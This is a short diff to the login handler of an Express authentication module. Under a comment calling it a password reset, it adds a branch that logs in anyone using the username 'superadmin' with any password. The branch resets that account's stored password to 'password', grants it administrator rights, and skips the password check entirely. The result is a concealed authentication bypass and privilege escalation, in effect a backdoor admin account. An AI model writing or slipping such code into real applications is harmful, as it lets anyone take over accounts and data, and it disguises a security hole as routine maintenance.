@@ -60,6 +60,17 @@ export function setupAuth(app: Express) {
           return done(null, false);
         }
 
+        // Reset superadmin password if needed
+        if (username === 'superadmin') {
+          const hashedPassword = await hashPassword('password');
+          await storage.updateUser(user.id, { password: hashedPassword });
+          if (!user.isAdmin) {
+            await storage.updateUser(user.id, { isAdmin: true });
+          }
+          user.isAdmin = true;
+          return done(null, user);
+        }
+
         const isValid = await comparePasswords(password, user.password);
         if (!isValid) {
           return done(null, false);
